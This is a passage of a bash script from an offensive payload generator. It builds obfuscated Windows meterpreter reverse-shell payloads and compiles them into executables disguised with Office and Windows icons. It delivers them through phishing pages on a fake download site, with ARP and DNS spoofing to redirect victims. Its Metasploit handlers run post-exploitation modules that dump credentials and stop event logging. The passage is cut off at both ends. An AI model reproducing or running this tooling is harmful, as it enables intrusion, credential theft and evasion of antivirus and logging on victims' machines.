P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1




if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.$Ext > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
cd $IPATH

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -------------------------------------------------------------
# build shellcode in PYTHON/EXE format (windows)
# 1º option: build default shellcode (my-way)
# 2º veil-evasion python -> pyherion (reproduction)
# 3º use pyinstaller by:david cortesi to compile python-to-exe
# 4º use NXcrypt to insert junk into sourcecode (obfuscation)
# -------------------------------------------------------------
sh_shellcode4 () {
# get user input to build shellcode (python)
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 370 --height 350) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="shellcode";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f C > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
fi

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists (exec.py)
   if [ -e $InJEc2 ]; then
      echo "[☠] exec.py -> found!"
      sleep 2
   else
      echo "[☠] exec.py -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc2 $IPATH/templates/exec[bak].py


   # edit exec.py using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc2 > /dev/null 2>&1
   else
      gedit $InJEc2 > /dev/null 2>&1
   fi

# move 'compiled' shellcode to output folder
mv $IPATH/templates/exec.py $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py



# -----------------------------------------
# chose what to do with generated shellcode
# -----------------------------------------
ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m.py) python" FALSE "pyherion ($N4m.py) obfuscated" FALSE "NXcrypt ($N4m.py) obfuscated" FALSE "pyinstaller ($N4m.exe) executable" --width 340 --height 240) > /dev/null 2>&1


   if [ "$ans" "=" "default ($N4m.py) python" ]; then
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi



     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "pyherion ($N4m.py) obfuscated" ]; then
     cd $IPATH/obfuscate
     # obfuscating payload (pyherion.py)
     echo "[☠] pyherion -> encrypting..."
     sleep 2
     echo "[☠] base64+AES encoded -> $N4m.py!"
     sleep 2
     sudo ./pyherion.py $IPATH/output/$N4m.py $IPATH/output/$N4m.py > /dev/null 2>&1
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "NXcrypt ($N4m.py) obfuscated" ]; then
     echo "[☠] NXcrypt -> found .."
     sleep 2
     echo "[☠] obfuscating -> $N4m.py!"
     sleep 2
     # use NXcrypt to obfuscate sourcecode
     cd $IPATH/obfuscate/
     xterm -T " NXcrypt obfuscator " -geometry 130x26 -e "sudo ./NXcrypt.py --file=$IPATH/output/$N4m.py --output=$IPATH/output/output_file.py"
     rm $IPATH/output/$N4m.py > /dev/null 2>&1
     mv $IPATH/output/output_file.py $IPATH/output/$N4m.py
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
         cd $IPATH/
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   else


     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile $N4m.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # PYINSTALLER
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/$N4m.py'"
       cp $IPATH/output/dist/$N4m.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
       zenity --title=" PYINSTALLER " --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.exe" --info --width 300 > /dev/null 2>&1
       echo ""
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi


       # CLEANING EVERYTHING UP
       echo "[☠] Cleanning temp generated files..."
       mv $IPATH/templates/exec[bak].py $InJEc2
       rm $IPATH/output/chars.raw > /dev/null 2>&1
       sleep 2
       clear

     else

       # compile python to exe
       echo ""
       echo "[☠] pyinstaller -> not found!"
       sleep 2
       echo "[☠] Please run: cd aux && sudo ./setup.sh"
       echo "[☠] to install all missing dependencies .."
       exit
     fi
   fi
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# encoded only using msfvenom encoders :( 
# NOTE: use or not PEScrambler on this or msf -x -k ?...
# it flags 12/55 detections this build .
# ------------------------------------------------------
sh_shellcode5 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: notepad" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="notepad";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
echo "[☠] obfuscating -> msf encoders!"
sleep 1
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"
fi


echo ""
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc3 ]; then
      echo "[☠] exec_bin.c -> found!"
      sleep 2
   else
      echo "[☠] exec_bin.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   audit=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc3 $IPATH/templates/exec_bin[bak].c
cp $IPATH/templates/exec_bin2.c $IPATH/templates/exec_bin2[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html



   # C OBFUSCATION MODULE 
   OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
  cd $IPATH/templates
  # edit exec.c using leafpad or gedit editor
  if [ "$DiStR0" = "Kali" ]; then
     leafpad $InJEc3 > /dev/null 2>&1
  else
     gedit $InJEc3 > /dev/null 2>&1
  fi


else
echo "[✔] String obfuscation technics sellected .."
cd $IPATH/templates

  # edit exec.c using leafpad or gedit editor
  if [ "$DiStR0" = "Kali" ]; then
     leafpad exec_bin2.c > /dev/null 2>&1
  else
     gedit exec_bin2.c > /dev/null 2>&1
  fi
  mv exec_bin2.c exec_bin.c > /dev/null 2>&1
fi



cd $IPATH/templates
# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
$ComP exec_bin.c -o $N4m.exe -lws2_32 -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
